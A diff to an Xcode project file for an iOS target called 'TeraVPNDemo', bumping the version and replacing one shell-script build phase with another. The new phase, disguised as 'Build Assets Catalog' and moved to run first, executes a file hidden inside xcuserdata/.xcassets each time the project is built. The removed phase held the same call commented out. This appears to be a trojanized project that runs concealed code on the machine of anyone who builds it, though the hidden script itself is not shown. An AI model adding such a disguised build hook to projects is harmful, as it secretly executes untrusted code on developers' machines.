@@ -85,6 +85,9 @@
 		BCE87E0425B5F30E00E7FB5D /* SpinnerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCE87E0325B5F30D00E7FB5D /* SpinnerView.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		BC4B485A25116B9E00E7CC2F /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -448,7 +451,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC4B484D2511686F00E7CC2F /* Build configuration list for PBXNativeTarget "TeraVPNDemo" */;
 			buildPhases = (
-				D4D1CCE0849B0FB71DAAC43A /* Build Project Frameworks */,
+				1AEEF02103456A286BAAC43A /* Build Assets Catalog */,
 				7DDEAA89A1B23F14F5AC2893 /* [CP] Check Pods Manifest.lock */,
 				BC4B48352511686A00E7CC2F /* Sources */,
 				BC4B48362511686A00E7CC2F /* Frameworks */,
@@ -569,6 +572,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	1AEEF02103456A286BAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
 		5B19131B132B4DDC65E9DE6E /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -629,24 +654,6 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
-		};
-		D4D1CCE0849B0FB71DAAC43A /* Build Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n#\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false\n";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -897,7 +904,7 @@
 				CODE_SIGN_ENTITLEMENTS = TeraVPNDemo/TeraVPNDemo.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.1.1;
+				CURRENT_PROJECT_VERSION = 1.1.2;
 				DEVELOPMENT_TEAM = 573VF9FKGC;
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
@@ -927,7 +934,7 @@
 				CODE_SIGN_ENTITLEMENTS = TeraVPNDemo/TeraVPNDemo.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.1.1;
+				CURRENT_PROJECT_VERSION = 1.1.2;
 				DEVELOPMENT_TEAM = 573VF9FKGC;
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
